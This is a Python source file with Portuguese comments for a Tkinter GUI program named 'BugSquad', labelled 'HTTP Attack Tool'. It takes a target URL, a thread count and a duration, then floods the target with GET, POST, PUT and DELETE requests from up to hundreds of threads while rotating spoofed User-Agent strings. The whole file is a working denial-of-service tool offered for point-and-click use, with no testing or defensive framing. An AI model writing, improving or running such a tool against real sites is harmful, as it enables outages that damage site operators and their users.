#!/usr/bin/python3
# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import requests
import asyncio
from threading import Thread
from cryptography.fernet import Fernet
import random
import time

# Configurações Globais
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)
uagent = []

# Configurações do ataque
num_threads = 200
tempo_ataque = 120  # Tempo de ataque em segundos

def user_agent():
    """ Adiciona diferentes agentes de usuário à lista """
    uagent.extend([
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
    ])

class AttackApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("BugSquad")
        self.geometry("600x500")

        # Carrega a imagem de fundo
        self.bg_image_original = Image.open("Background (2).png")
        self.bg_image = ImageTk.PhotoImage(self.bg_image_original)

        # Label para exibir a imagem de fundo
        self.bg_label = tk.Label(self)
        self.bg_label.place(relwidth=1, relheight=1)

        # Carregar o logo
        self.logo_image = Image.open("logo.png")
        self.logo_image = self.logo_image.resize((250, 150), Image.LANCZOS)
        self.logo_photo = ImageTk.PhotoImage(self.logo_image)

        # Label para exibir o logo
        self.logo_label = tk.Label(self, image=self.logo_photo, bg="#080B36")
        self.logo_label.pack(pady=10)

        # Variáveis
        self.target_url = tk.StringVar()
        self.thread_count = tk.IntVar(value=200)  # Número de threads
        self.attack_duration = tk.IntVar(value=120)  # Duração do ataque

        # Título
        title_label = tk.Label(self, text="HTTP Attack Tool", font=("Exo", 16), bg="#080B36", fg="white")
        title_label.pack(pady=10)

        # URL alvo
        target_label = tk.Label(self, text="Target URL:", bg="#080B36", fg="white")
        target_label.pack()
        self.target_entry = tk.Entry(self, textvariable=self.target_url, width=40)
        self.target_entry.pack(pady=5)

        # Número de Threads
        thread_label = tk.Label(self, text="Number of Threads:", bg="#080B36", fg="white")
        thread_label.pack()
        self.thread_entry = tk.Entry(self, textvariable=self.thread_count, width=10)
        self.thread_entry.pack(pady=5)

        # Duração do ataque
        duration_label = tk.Label(self, text="Attack Duration (seconds):", bg="#080B36", fg="white")
        duration_label.pack()
        self.duration_entry = tk.Entry(self, textvariable=self.attack_duration, width=10)
        self.duration_entry.pack(pady=5)

        # Botão de Início
        start_button = ttk.Button(self, text="Start Attack", command=self.start_attack)
        start_button.pack(pady=10)

        # Console de saída
        self.console_output = tk.Text(self, height=10, width=70)
        self.console_output.pack(pady=10)

        # Vincular evento de redimensionamento para atualizar o fundo
        self.bind("<Configure>", self.resize_background)

    def resize_background(self, event):
        """Redimensiona a imagem de fundo para se ajustar ao tamanho da janela."""
        new_width = event.width
        new_height = event.height
        resized_image = self.bg_image_original.resize((new_width, new_height), Image.LANCZOS)
        self.bg_image = ImageTk.PhotoImage(resized_image)
        self.bg_label.config(image=self.bg_image)

    def log_output(self, message):
        """ Exibe mensagem na saída do console """
        self.console_output.insert(tk.END, message + "\n")
        self.console_output.see(tk.END)

    def start_attack(self):
        """ Inicia o ataque em uma nova thread """
        target_url = self.target_url.get()
        threads = self.thread_count.get()
        duration = self.attack_duration.get()

        if target_url:
            self.log_output(f"Iniciando ataque ao URL: {target_url}")
            self.log_output(f"Usando {threads} threads por {duration} segundos")
            attack_thread = Thread(target=self.run_attack, args=(target_url, threads, duration))
            attack_thread.start()
        else:
            self.log_output("Por favor, insira uma URL válida.")

    def run_attack(self, target_url, threads, duration):
        """ Executa a lógica de ataque """
        self.attack_logic(target_url, threads, duration)

    def attack_logic(self, target_url, threads, duration):
        """ Lógica de ataque com múltiplas threads """
        user_agent()  # Configura os User Agents
        fim_ataque = time.time() + duration
        self.log_output("Ataque em execução...")

        def send_requests():
            while time.time() < fim_ataque:
                headers = {
                    'User-Agent': random.choice(uagent),
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                try:
                    response_get = requests.get(target_url, headers=headers, timeout=1)
                    response_post = requests.post(target_url, headers=headers, data={'key': 'value'}, timeout=1)
                    response_put = requests.put(target_url, headers=headers, data={'key': 'value'}, timeout=1)
                    response_delete = requests.delete(target_url, headers=headers, timeout=1)

                    self.log_output(f"GET Status: {response_get.status_code}")
                    self.log_output(f"POST Status: {response_post.status_code}")
                    self.log_output(f"PUT Status: {response_put.status_code}")
                    self.log_output(f"DELETE Status: {response_delete.status_code}")

                except requests.exceptions.RequestException as e:
                    self.log_output(f"Erro na requisição: {e}")

        # Iniciar múltiplas threads
        for i in range(threads):
            t = Thread(target=send_requests)
            t.start()

        self.log_output(f"Ataque encerrado após {duration} segundos.")

if __name__ == "__main__":
    app = AttackApp()
    app.mainloop()

